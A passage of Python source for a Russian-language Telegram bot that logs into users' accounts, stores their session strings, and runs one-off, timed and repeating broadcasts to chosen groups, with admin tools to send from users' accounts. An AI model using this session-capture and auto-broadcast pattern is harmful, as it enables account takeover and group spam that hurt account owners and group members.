import asyncio
import csv
import io
import html
import logging
from datetime import datetime, timezone
from contextlib import suppress

from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile, BotCommand, LabeledPrice, PreCheckoutQuery
)
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError

import db
import sender
from config import config

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("VortenaBot")

bot = Bot(config.bot_token)
dp = Dispatcher()
campaign_tasks: dict[int, asyncio.Task] = {}
timer_tasks: dict[int, asyncio.Task] = {}
auto_tasks: dict[int, asyncio.Task] = {}
auto_intervals: dict[int, int] = {}  # cached seconds; persisted in PostgreSQL settings table
auto_panel_refs: dict[int, tuple[int, int]] = {}  # user_id -> (chat_id, message_id)
signature_cache: dict[int, bool] = {}
shutting_down = False  # Keep persisted auto campaigns enabled during graceful deploy/restart.
login_clients: dict[int, TelegramClient] = {}

class LoginFlow(StatesGroup):
    phone = State()
    code = State()
    password = State()

class TextFlow(StatesGroup):
    broadcast_text = State()
    timer_text = State()
    timer_datetime = State()
    auto_text = State()

class AdminFlow(StatesGroup):
    add_user = State()
    add_admin = State()
    give_stars = State()
    price_value = State()
    force_sub = State()
    admin_user_broadcast_id = State()
    admin_user_broadcast_text = State()
    global_broadcast_text = State()
    refresh_user = State()
    remove_admin = State()
    add_user_campaign_id = State()
    add_user_campaign_text = State()
    edit_user_campaign_text = State()

MAIN_KB = ReplyKeyboardMarkup(keyboard=[
    [KeyboardButton(text="🔗 Подключить аккаунт"), KeyboardButton(text="🔌 Отключить аккаунт")],
    [KeyboardButton(text="👥 Группы")],
    [KeyboardButton(text="📨 Рассылка"), KeyboardButton(text="🤖 Авторассылка")],
    [KeyboardButton(text="⏱ Рассылка по таймеру"), KeyboardButton(text="⏳ Интервал")],
    [KeyboardButton(text="✍️ Подпись"), KeyboardButton(text="⭐ Мои звёзды")],
    [KeyboardButton(text="🔄 Обновить группы"), KeyboardButton(text="📋 Мои задачи")],
    [KeyboardButton(text="🛑 Остановить рассылку"), KeyboardButton(text="⏹ Стоп авторассылки")],
    [KeyboardButton(text="☰ Меню"), KeyboardButton(text="❌ Закрыть действие")],
], resize_keyboard=True)

ADMIN_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="adm:add_user"),
     InlineKeyboardButton(text="➕ Добавить администратора", callback_data="adm:add_admin")],
    [InlineKeyboardButton(text="👑 Список администраторов", callback_data="adm:admins"),
     InlineKeyboardButton(text="⭐ Начислить звёзды", callback_data="adm:stars")],
    [InlineKeyboardButton(text="💰 Цены", callback_data="adm:prices"),
     InlineKeyboardButton(text="📢 Обязательная подписка", callback_data="adm:subs")],
    [InlineKeyboardButton(text="📨 От аккаунта пользователя", callback_data="adm:user_broadcast"),
     InlineKeyboardButton(text="🌐 Общая рассылка", callback_data="adm:global_broadcast")],
    [InlineKeyboardButton(text="👥 Пользователи", callback_data="adm:users"),
     InlineKeyboardButton(text="📤 Экспорт CSV", callback_data="adm:csv")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="adm:stats")],
    [InlineKeyboardButton(text="🔄 Данные пользователя", callback_data="adm:refresh_user"),
     InlineKeyboardButton(text="🗑 Удалить администратора", callback_data="adm:remove_admin")],
    [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
])

PRICE_KEYS = {
    "connect_price": "Подключение",
    "broadcast_price": "Рассылка",
    "unsign_price": "Отключение подписи",
    "timer_price": "Таймер",
    "groups_refresh_price": "Обновление групп",
    "fetch_groups_price": "Загрузка групп",
}

def with_close(rows):
    """Append a consistent close button to an inline menu."""
    return InlineKeyboardMarkup(inline_keyboard=[*rows, [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")]])


def is_super(user_id: int) -> bool:
    return user_id in config.super_admins

async def admin_check(user_id: int) -> bool:
    return await db.is_admin(user_id, config.super_admins)

async def charge_if_needed(user_id: int, price_key: str) -> bool:
    if await admin_check(user_id):
        return True
    price = await db.get_price(price_key)
    if price <= 0:
        return True
    return await db.spend_stars(user_id, price)

async def force_sub_check(user_id: int) -> tuple[bool, list[str]]:
    subs = await db.list_force_subs()
    missing = []
    for sub in subs:
        ref = sub["chat_ref"]
        try:
            member = await bot.get_chat_member(ref, user_id)
            if member.status not in ("creator", "administrator", "member"):
                missing.append(ref)
        except Exception:
            # Агар бот дар канал/гурӯҳ ҳуқуқи санҷиш надошта бошад, обуна тасдиқ намешавад.
            missing.append(ref)
    return not missing, missing

def force_sub_kb(refs: list[str]):
    rows = []
    for ref in refs:
        url = ref if ref.startswith("https://") else (f"https://t.me/{ref.lstrip('@')}" if not ref.startswith("-100") else "")
        if url:
            rows.append([InlineKeyboardButton(text=f"📢 Подписаться: {ref}", url=url)])
    rows.append([InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subs")])
    return with_close(rows)

async def show_home(message: Message):
    await message.answer("Здравствуйте! VortenaBot готов к работе. Выберите действие в меню.", reply_markup=MAIN_KB)
    if await admin_check(message.from_user.id):
        await message.answer("👑 Панель администратора", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👑 Панель администратора", callback_data="adm:open")],
            [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")]
        ]))

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    await state.clear()
    user = message.from_user
    await db.upsert_user(user.id, user.username, user.full_name)
    allowed, missing = await force_sub_check(user.id)
    if not allowed:
        await message.answer("Для использования бота сначала подпишитесь на следующие каналы/группы:", reply_markup=force_sub_kb(missing))
        return
    user_row = await db.get_user(user.id)
    account_status = "✅ Аккаунт подключён" if user_row and user_row["session_string"] else "⚪ Аккаунт не подключён"
    await message.answer(account_status)
    await show_home(message)

@dp.callback_query(F.data == "check_subs")
async def check_subs(callback: CallbackQuery):
    allowed, missing = await force_sub_check(callback.from_user.id)
    if allowed:
        await callback.message.answer("Подписка подтверждена.")
        await show_home(callback.message)
    else:
        await callback.answer("Вы ещё не подписались на все каналы/группы.", show_alert=True)
    await callback.answer()

MENU_BUTTONS = {
    "🔗 Подключить аккаунт", "🔌 Отключить аккаунт", "👥 Группы", "📨 Рассылка", "🤖 Авторассылка", "⏱ Рассылка по таймеру",
    "⏳ Интервал", "✍️ Подпись", "⭐ Мои звёзды", "🔄 Обновить группы",
    "🛑 Остановить рассылку", "⏹ Стоп авторассылки", "📋 Мои задачи", "☰ Меню", "❌ Закрыть действие",
}

@dp.message(F.text.in_(MENU_BUTTONS))
async def route_menu_button(message: Message, state: FSMContext):
    """Menu buttons take priority over FSM input handlers, preventing 'format not found' errors."""
    current_state = await state.get_state()
    if current_state:
        if current_state.startswith("LoginFlow:"):
            await cleanup_login(message.from_user.id, state)
        else:
            await state.clear()

    if message.text == "❌ Закрыть действие":
        await message.answer("✅ Действие закрыто. Выберите следующий пункт меню.", reply_markup=MAIN_KB)
    elif message.text == "🔗 Подключить аккаунт":
        await connect_start(message, state)
    elif message.text == "🔌 Отключить аккаунт":
        await disconnect_account(message)
    elif message.text == "👥 Группы":
        await groups_menu(message)
    elif message.text == "📨 Рассылка":
        await broadcast_start(message, state)
    elif message.text == "🤖 Авторассылка":
        await auto_menu(message)
    elif message.text == "⏹ Стоп авторассылки":
        await stop_auto(message)
    elif message.text == "⏱ Рассылка по таймеру":
        await timer_start(message, state)
    elif message.text == "⏳ Интервал":
        await delay_menu(message)
    elif message.text == "✍️ Подпись":
        await signature_menu(message)
    elif message.text == "⭐ Мои звёзды":
        await my_stars(message)
    elif message.text == "🔄 Обновить группы":
        await refresh_groups(message)
    elif message.text == "🛑 Остановить рассылку":
        await stop_campaign(message)
    elif message.text == "📋 Мои задачи":
        await my_tasks(message)
    else:
        await show_home(message)

@dp.callback_query(F.data == "ui:close")
async def close_inline_menu(callback: CallbackQuery, state: FSMContext):
    current_state = await state.get_state()
    if current_state:
        if current_state.startswith("LoginFlow:"):
            await cleanup_login(callback.from_user.id, state)
        else:
            await state.clear()
    if callback.message:
        ref = auto_panel_refs.get(callback.from_user.id)
        if ref == (callback.message.chat.id, callback.message.message_id):
            # Closing a panel should keep it closed even when an auto task later finishes.
            auto_panel_refs.pop(callback.from_user.id, None)
        with suppress(Exception):
            await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("Действие закрыто")

@dp.message(Command("cancel"))
async def cancel_action(message: Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state and current_state.startswith("LoginFlow:"):
        await cleanup_login(message.from_user.id, state)
    else:
        await state.clear()
    await message.answer("✅ Текущее действие отменено.", reply_markup=MAIN_KB)

@dp.message(Command("menu"))
@dp.message(F.text == "☰ Меню")
async def menu_command(message: Message):
    await show_home(message)

@dp.message(Command("users"))
async def users_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await show_users_page(message, 0)

@dp.message(Command("admin"))
async def admin_command(message: Message):
    if not await admin_check(message.from_user.id):
        await message.answer("Доступ запрещён.")
        return
    await message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)

@dp.callback_query(F.data == "adm:open")
async def admin_open(callback: CallbackQuery):
    if not await admin_check(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await callback.message.answer("👑 Панель администратора", reply_markup=ADMIN_KB)
    await callback.answer()

async def require_user(message: Message):
    user = await db.get_user(message.from_user.id)
    if not user:
        await db.upsert_user(message.from_user.id, message.from_user.username, message.from_user.full_name)
        user = await db.get_user(message.from_user.id)
    return user

@dp.message(F.text == "🔗 Подключить аккаунт")
async def connect_start(message: Message, state: FSMContext):
    await require_user(message)
    if not await charge_if_needed(message.from_user.id, "connect_price"):
        await message.answer("Недостаточно звёзд.")
        return
    await state.set_state(LoginFlow.phone)
    await message.answer("Отправьте номер телефона Telegram. Код страны определяется автоматически по номеру: Россия +7, Таджикистан +992. Примеры: +79991234567 или +992900000000.\nНикому не сообщайте код входа и пароль двухэтапной аутентификации (2FA).")

@dp.message(LoginFlow.phone)
async def connect_phone(message: Message, state: FSMContext):
    raw_phone = (message.text or "").strip()
    digits = "".join(ch for ch in raw_phone if ch.isdigit())
    # Автоматически определяем код страны по введённому номеру: Таджикистан +992, Россия +7.
    if raw_phone.startswith("+"):
        phone = "+" + digits
    elif digits.startswith("992"):
        phone = "+" + digits
    elif digits.startswith("7"):
        phone = "+" + digits
    elif len(digits) == 9 and digits.startswith("9"):
        phone = "+992" + digits
    elif len(digits) == 10 and digits.startswith("9"):
        phone = "+7" + digits
    else:
        await message.answer("Не удалось определить страну. Введите номер с кодом +7 (Россия) или +992 (Таджикистан), например +79991234567 или +992900000000.")
        return
    if len(phone) < 8 or len(phone) > 20:
        await message.answer("Неверный номер. Пример: +992900000000 или +79991234567")
        return
    client = TelegramClient(StringSession(), config.api_id, config.api_hash)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        login_clients[message.from_user.id] = client
        await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
        await state.set_state(LoginFlow.code)
        await message.answer("Введите код, полученный от Telegram, в формате 52.301 (точка будет удалена автоматически).")
    except PhoneNumberInvalidError:
        await client.disconnect()
        await message.answer("Неверный номер телефона. Попробуйте ещё раз.")
    except Exception as exc:
        await client.disconnect()
        log.exception("Failed to request login code")
        await message.answer(f"Не удалось отправить код: {type(exc).__name__}. Попробуйте позже.")

@dp.message(LoginFlow.code)
async def connect_code(message: Message, state: FSMContext):
    code_raw = (message.text or "").strip()
    # Пользователь может вводить код как 52.301; Telegram API получает только цифры.
    code = "".join(ch for ch in code_raw if ch.isdigit())
    data = await state.get_data()
    client = login_clients.get(message.from_user.id)
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    try:
        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except SessionPasswordNeededError:
        await state.set_state(LoginFlow.password)
        await message.answer("Включена двухэтапная аутентификация Telegram (2FA). Введите пароль 2FA. Пароль не сохраняется в базе данных.")
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        await message.answer("Неверный или просроченный код. Запросите новый код и введите его в формате 52.301.")
    except Exception as exc:
        log.exception("Login code failed")
        await message.answer(f"Не удалось войти: {type(exc).__name__}.")
        await cleanup_login(message.from_user.id, state)

@dp.message(LoginFlow.password)
async def connect_password(message: Message, state: FSMContext):
    client = login_clients.get(message.from_user.id)
    data = await state.get_data()
    if not client:
        await state.clear()
        await message.answer("Сессия входа потеряна. Начните подключение заново.")
        return
    password = (message.text or "").strip()
    try:
        await client.sign_in(password=password)
        await db.save_session(message.from_user.id, client.session.save(), data["phone"])
        await state.clear()
        login_clients.pop(message.from_user.id, None)
        await client.disconnect()
        await message.answer("✅ Аккаунт успешно подключён.")
    except PasswordHashInvalidError:
        await message.answer("Неверный пароль 2FA. Проверьте пароль и попробуйте ещё раз.")
    except Exception as exc:
        log.exception("2FA login failed")
        await message.answer(f"Не удалось завершить вход через 2FA: {type(exc).__name__}. Проверьте пароль и попробуйте ещё раз.")

async def disconnect_account(message: Message):
    user_id = message.from_user.id
    user = await require_user(message)
    if not user or not user["session_string"]:
        await message.answer("⚪ Аккаунт не подключён. Нажмите «🔗 Подключить аккаунт», чтобы подключить его.", reply_markup=MAIN_KB)
        return
    task = auto_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        with suppress(asyncio.CancelledError):
            await task
    await db.disable_auto_campaign(user_id)
    await db.clear_session(user_id)
    await refresh_auto_panel(user_id)
    await message.answer("✅ Аккаунт отключён. Авторассылка остановлена. Чтобы продолжить, нажмите «🔗 Подключить аккаунт».", reply_markup=MAIN_KB)

async def cleanup_login(user_id: int, state: FSMContext):
    client = login_clients.pop(user_id, None)
    if client:
        with suppress(Exception):
            await client.disconnect()
    await state.clear()

def groups_keyboard(groups):
    rows = []
    for group in groups:
        mark = "✅" if group["is_selected"] else "⬜️"
        status = "" if group["can_send"] else " · нет прав на отправку"
        title = (group["title"] or str(group["chat_id"]))[:38]
        rows.append([InlineKeyboardButton(text=f"{mark} {title}{status}", callback_data=f"grp:{group['chat_id']}")])
    rows.append([InlineKeyboardButton(text="💾 Сохранить выбор", callback_data="grp:save")])
    return with_close(rows)

@dp.message(F.text == "👥 Группы")
async def groups_menu(message: Message):
    await require_user(message)
    groups = await db.list_groups(message.from_user.id)
    if not groups:
        await message.answer("Список групп пуст. Нажмите «🔄 Обновить группы».")
        return
    await message.answer("Выберите несколько групп. Нажатия отмечают/снимают выбор; остальные кнопки останутся на месте. После выбора нажмите «Сохранить выбор».", reply_markup=groups_keyboard(groups))

@dp.callback_query(F.data.startswith("grp:"))
async def group_toggle(callback: CallbackQuery):
    if callback.data == "grp:save":
        groups = await db.list_groups(callback.from_user.id)
        chosen = sum(1 for g in groups if g["is_selected"] and g["can_send"])
        await callback.answer(f"Выбор сохранён: {chosen} групп(ы)", show_alert=True)
        await callback.message.edit_text(f"✅ Выбор сохранён. Выбрано групп с правом отправки: {chosen}.", reply_markup=groups_keyboard(groups))
        return
    try:
        chat_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Некорректная группа", show_alert=True)
        return
    row = await db.toggle_group(callback.from_user.id, chat_id)
    if not row:
        await callback.answer("Группа не найдена", show_alert=True)
        return
    groups = await db.list_groups(callback.from_user.id)
    await callback.message.edit_reply_markup(reply_markup=groups_keyboard(groups))
    await callback.answer("Группа выбрана" if row["is_selected"] else "Выбор группы снят")

@dp.message(F.text == "🔄 Обновить группы")
async def refresh_groups(message: Message):
    user_id = message.from_user.id
    user = await require_user(message)
    if not await charge_if_needed(user_id, "groups_refresh_price"):
        await message.answer("Недостаточно звёзд.")
        return
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    await message.answer("Загружаю группы…")
    try:
        groups = await sender.fetch_user_groups(user["session_string"])
        await db.upsert_groups(user_id, groups)
        await message.answer(f"✅ Группы обновлены. Количество: {len(groups)}")
    except Exception as exc:
        log.exception("Group refresh failed")
        await message.answer(f"Не удалось загрузить группы: {type(exc).__name__}: {exc}")

@dp.message(F.text == "📨 Рассылка")
async def broadcast_start(message: Message, state: FSMContext):
    if not await charge_if_needed(message.from_user.id, "broadcast_price"):
        await message.answer("Недостаточно звёзд.")
        return
    user = await require_user(message)
    if not user["session_string"]:
        await message.answer("Сначала подключите аккаунт.")
        return
    groups = await db.selected_groups(message.from_user.id)
    if not groups:
        await message.answer("Сначала выберите группы.")
        return
    await state.set_state(TextFlow.broadcast_text)
    await message.answer(f"Отправьте текст сообщения. Оно будет отправлено в {len(groups)} выбранных групп. Интервал: {user['delay_seconds']} сек.")

@dp.message(TextFlow.broadcast_text)
async def broadcast_text(message: Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer("Сообщение пустое. Отправьте текст.")
        return
    user_id = message.from_user.id
    await state.clear()
    old = campaign_tasks.get(user_id)
    if old and not old.done():
        await message.answer("Рассылка уже выполняется. Сначала остановите её.")
        return
    task = asyncio.create_task(run_campaign(user_id, text, message.chat.id))
    campaign_tasks[user_id] = task
    await message.answer("Рассылка запущена. Если Telegram применит ограничение, рассылка остановится.")

async def run_campaign(user_id: int, text: str, chat_id: int):
    try:
        result = await sender.send_campaign(user_id, text)
        msg = f"Рассылка завершена.\nОтправлено: {result['sent']}\nОшибок: {result['failed']}"
        if result["stopped"]:
            msg += "\n⚠️ Telegram применил ограничение или медленный режим. Рассылка остановлена."
        if result.get("errors"):
            msg += "\n\nПодробности:\n" + "\n".join(f"• {e}" for e in result["errors"][:5])
        await bot.send_message(chat_id, msg)
    except Exception as exc:
        log.exception("Campaign failed")
        await bot.send_message(chat_id, f"Не удалось выполнить рассылку: {type(exc).__name__}: {exc}")
    finally:
        campaign_tasks.pop(user_id, None)

@dp.message(F.text == "🛑 Остановить рассылку")
async def stop_campaign(message: Message):
    task = campaign_tasks.get(message.from_user.id)
    if task and not task.done():
        task.cancel()
        await message.answer("Запрос на остановку отправлен.")
    else:
        await message.answer("Активной рассылки нет.")
    timer = timer_tasks.get(message.from_user.id)
    if timer and not timer.done():
        timer.cancel()
        await message.answer("Таймер также остановлен.")
    auto = auto_tasks.get(message.from_user.id)
    if auto and not auto.done():
        auto.cancel()
        await message.answer("Авторассылка также остановлена.")

AUTO_INTERVALS = (120, 180, 300, 600, 900, 1200)  # 2, 3, 5, 10, 15, 20 minutes
AUTO_INTERVAL_LABELS = {120: "2 мин", 180: "3 мин", 300: "5 мин", 600: "10 мин", 900: "15 мин", 1200: "20 мин"}


async def get_auto_interval(user_id: int) -> int:
    """Read and cache the per-user auto-broadcast interval, defaulting to 5 minutes."""
    cached = auto_intervals.get(user_id)
    if cached in AUTO_INTERVALS:
        return cached
    try:
        async with db.get_pool().acquire() as con:
            value = await con.fetchval("SELECT value FROM settings WHERE key=$1", f"auto_interval:{user_id}")
        seconds = int(value) if value is not None else 300
    except (TypeError, ValueError):
        seconds = 300
    except Exception:
        log.exception("Could not load auto-broadcast interval for user %s", user_id)
        seconds = 300
    if seconds not in AUTO_INTERVALS:
        seconds = 300
    auto_intervals[user_id] = seconds
    return seconds


async def save_auto_interval(user_id: int, seconds: int) -> None:
    if seconds not in AUTO_INTERVALS:
        raise ValueError("Недопустимый интервал авторассылки")
    async with db.get_pool().acquire() as con:
        await con.execute(
            "INSERT INTO settings(key, value) VALUES($1, $2) "
            "ON CONFLICT(key) DO UPDATE SET value=EXCLUDED.value",
            f"auto_interval:{user_id}", str(seconds),
        )
    auto_intervals[user_id] = seconds


def auto_keyboard(user_id: int, seconds: int | None = None):
    seconds = seconds or auto_intervals.get(user_id, 300)
    running = user_id in auto_tasks and not auto_tasks[user_id].done()
    action = (InlineKeyboardButton(text="⏹ Остановить", callback_data="auto:stop")
              if running else InlineKeyboardButton(text="▶️ Запустить", callback_data="auto:begin"))
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⏱ Интервал: {AUTO_INTERVAL_LABELS.get(seconds, '5 мин')}", callback_data="auto:interval")],
        [InlineKeyboardButton(text="✍️ Подпись: ВКЛ" if signature_cache.get(user_id, True) else "✍️ Подпись: ВЫКЛ", callback_data="auto:signature")],
        [action],
        [InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
    ])


async def auto_panel_text(user_id: int) -> str:
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    signature_cache[user_id] = bool(user["signature_enabled"]) if user else True
    seconds = await get_auto_interval(user_id)
    running = user_id in auto_tasks and not auto_tasks[user_id].done()
    status = "🟢 Включена" if running else "🔴 Отключена"
    account = "✅ Подключён" if user and user["session_string"] else "❌ Не подключён"
    group_lines = "\n".join(f"• {html.escape(str(g['title'] or g['chat_id']))}" for g in groups[:20]) or "• Нет выбранных групп"
    if len(groups) > 20:
        group_lines += f"\n… и ещё {len(groups)-20}"
    return (
        "🤖 <b>ПАНЕЛЬ АВТОРАССЫЛКИ</b>\n\n"
        f"📊 <b>Статус:</b> {status}\n"
        f"👤 <b>Аккаунт:</b> {account}\n"
        f"✍️ <b>Подпись:</b> {'включена' if user and user['signature_enabled'] else 'выключена'}\n"
        f"👥 <b>Выбрано групп:</b> {len(groups)}\n{group_lines}\n"
        f"⏱ <b>Интервал:</b> {AUTO_INTERVAL_LABELS[seconds]}\n\n"
        "📨 Текст вашей авторассылки повторяется в выбранных группах. Упоминания в тексте сохраняются.\n"
        "ℹ️ Интервал отсчитывается после завершения одного полного цикла.\n"
        "⚠️ При ограничении Telegram рассылка остановится автоматически."
    )


async def edit_auto_panel(chat_id: int, message_id: int, user_id: int) -> None:
    text = await auto_panel_text(user_id)
    seconds = await get_auto_interval(user_id)
    with suppress(TelegramBadRequest):
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=auto_keyboard(user_id, seconds),
            parse_mode="HTML",
        )


async def refresh_auto_panel(user_id: int) -> None:
    ref = auto_panel_refs.get(user_id)
    if not ref:
        return
    chat_id, message_id = ref
    try:
        await edit_auto_panel(chat_id, message_id, user_id)
    except Exception:
        log.exception("Could not refresh auto-broadcast panel for user %s", user_id)


async def auto_menu(message: Message):
    user_id = message.from_user.id
    await require_user(message)
    seconds = await get_auto_interval(user_id)
    sent = await message.answer(
        await auto_panel_text(user_id),
        reply_markup=auto_keyboard(user_id, seconds),
        parse_mode="HTML",
    )
    auto_panel_refs[user_id] = (sent.chat.id, sent.message_id)


@dp.callback_query(F.data == "auto:signature")
async def auto_signature_toggle(callback: CallbackQuery):
    user = await db.get_user(callback.from_user.id)
    if not user:
        await callback.answer("Сначала нажмите /start", show_alert=True)
        return
    enabled = bool(user["signature_enabled"])
    if enabled:
        price = await db.get_price("unsign_price")
        if price > 0 and not await admin_check(callback.from_user.id):
            payload = f"unsign:{callback.from_user.id}"
            await bot.send_invoice(
                chat_id=callback.from_user.id,
                title="Отключение подписи",
                description="Отключить подпись «Отправлено через @VortenaBot» в рассылках.",
                payload=payload,
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label="Отключение подписи", amount=price)],
            )
            await callback.answer("Оплатите счёт Telegram Stars для отключения подписи.")
            return
        await db.set_signature(callback.from_user.id, False)
        signature_cache[callback.from_user.id] = False
        await callback.answer("Подпись отключена")
    else:
        await db.set_signature(callback.from_user.id, True)
        signature_cache[callback.from_user.id] = True
        await callback.answer("Подпись включена")
    if callback.message:
        await edit_auto_panel(callback.message.chat.id, callback.message.message_id, callback.from_user.id)

@dp.pre_checkout_query()
async def stars_pre_checkout(query: PreCheckoutQuery):
    if query.invoice_payload.startswith("unsign:"):
        try:
            target_id = int(query.invoice_payload.split(":", 1)[1])
        except (ValueError, IndexError):
            await query.answer(ok=False, error_message="Некорректный счёт.")
            return
        if target_id != query.from_user.id:
            await query.answer(ok=False, error_message="Этот счёт принадлежит другому пользователю.")
            return
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="Неизвестный тип оплаты.")

@dp.message(F.successful_payment)
async def stars_payment_success(message: Message):
    payment = message.successful_payment
    payload = payment.invoice_payload if payment else ""
    if payload.startswith("unsign:"):
        try:
            target_id = int(payload.split(":", 1)[1])
        except (ValueError, IndexError):
            await message.answer("Платёж получен, но не удалось определить действие. Обратитесь к администратору.")
            return
        if target_id != message.from_user.id:
            await message.answer("Счёт не принадлежит этому аккаунту. Подпись не изменена.")
            return
        await db.set_signature(target_id, False)
        signature_cache[target_id] = False
        await message.answer("✅ Оплата получена. Подпись отключена.", reply_markup=MAIN_KB)
        await refresh_auto_panel(target_id)

@dp.callback_query(F.data == "auto:interval")
async def auto_interval_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    rows = [
        [InlineKeyboardButton(text="2 мин", callback_data="auto:set:120"),
         InlineKeyboardButton(text="3 мин", callback_data="auto:set:180")],
        [InlineKeyboardButton(text="5 мин", callback_data="auto:set:300"),
         InlineKeyboardButton(text="10 мин", callback_data="auto:set:600")],
        [InlineKeyboardButton(text="15 мин", callback_data="auto:set:900"),
         InlineKeyboardButton(text="20 мин", callback_data="auto:set:1200")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="auto:back"),
         InlineKeyboardButton(text="❌ Закрыть", callback_data="ui:close")],
    ]
    await callback.message.edit_text(
        "⏱ <b>Интервал авторассылки</b>\n\nВыберите интервал от 2 до 20 минут. Он применяется после завершения отправки во все выбранные группы.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await callback.answer()


@dp.callback_query(F.data.startswith("auto:set:"))
async def auto_set_interval(callback: CallbackQuery):
    try:
        seconds = int(callback.data.rsplit(":", 1)[1])
    except (TypeError, ValueError):
        await callback.answer("Некорректный интервал", show_alert=True)
        return
    if seconds not in AUTO_INTERVALS:
        await callback.answer("Выберите интервал от 2 до 20 минут", show_alert=True)
        return
    try:
        await save_auto_interval(callback.from_user.id, seconds)
    except Exception as exc:
        log.exception("Could not save auto-broadcast interval")
        await callback.answer(f"Не удалось сохранить: {type(exc).__name__}", show_alert=True)
        return
    if callback.message:
        auto_panel_refs[callback.from_user.id] = (callback.message.chat.id, callback.message.message_id)
        await edit_auto_panel(callback.message.chat.id, callback.message.message_id, callback.from_user.id)
    await callback.answer(f"Интервал сохранён: {AUTO_INTERVAL_LABELS[seconds]}")


@dp.callback_query(F.data == "auto:back")
async def auto_back(callback: CallbackQuery):
    if callback.message:
        auto_panel_refs[callback.from_user.id] = (callback.message.chat.id, callback.message.message_id)
        await edit_auto_panel(callback.message.chat.id, callback.message.message_id, callback.from_user.id)
    await callback.answer()


@dp.callback_query(F.data == "auto:status")
async def auto_status(callback: CallbackQuery):
    await callback.answer("Авторассылка уже работает")
    await refresh_auto_panel(callback.from_user.id)


@dp.callback_query(F.data == "auto:begin")
async def auto_begin(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    if not user or not user["session_string"]:
        await callback.answer("Сначала подключите аккаунт Telegram", show_alert=True)
        return
    if not groups:
        await callback.answer("Сначала выберите группы и сохраните выбор", show_alert=True)
        return
    old = auto_tasks.get(user_id)
    if old and not old.done():
        await callback.answer("Авторассылка уже работает", show_alert=True)
        await refresh_auto_panel(user_id)
        return
    if callback.message:
        auto_panel_refs[user_id] = (callback.message.chat.id, callback.message.message_id)
    await state.clear()
    await state.set_state(TextFlow.auto_text)
    if callback.message:
        await state.update_data(auto_panel_chat_id=callback.message.chat.id,
                                auto_panel_message_id=callback.message.message_id)
    await callback.message.answer(
        "✍️ <b>Отправьте текст для авторассылки.</b>\n\n"
        "Сообщение будет регулярно отправляться в выбранные группы.\n"
        "Для отмены нажмите «❌ Закрыть действие» или отправьте /cancel.",
        reply_markup=MAIN_KB, parse_mode="HTML")
    await callback.answer()


@dp.message(TextFlow.auto_text)
async def auto_text(message: Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer("⚠️ Отправьте непустой текст или отмените действие кнопкой «❌ Закрыть действие».")
        return
    user_id = message.from_user.id
    state_data = await state.get_data()
    user = await db.get_user(user_id)
    groups = await db.selected_groups(user_id)
    if not user or not user["session_string"] or not groups:
        await state.clear()
        await message.answer("❌ Не удалось запустить. Проверьте подключение аккаунта и выбранные группы.", reply_markup=MAIN_KB)
        await refresh_auto_panel(user_id)
        return
    old = auto_tasks.get(user_id)
    if old and not old.done():
        await state.clear()
        await message.answer("⚠️ Авторассылка уже работает.", reply_markup=MAIN_KB)
        await refresh_auto_panel(user_id)
        return
    await state.clear()
    try:
        await db.save_auto_campaign(user_id, text, message.chat.id)
    except Exception as exc:
        log.exception("Could not persist auto-broadcast campaign for user %s", user_id)
        await message.answer(
            f"❌ Не удалось сохранить авторассылку: {html.escape(type(exc).__name__)}. Попробуйте ещё раз.",
            reply_markup=MAIN_KB,
            parse_mode="HTML",
        )
        await refresh_auto_panel(user_id)
        return
    seconds = await get_auto_interval(user_id)
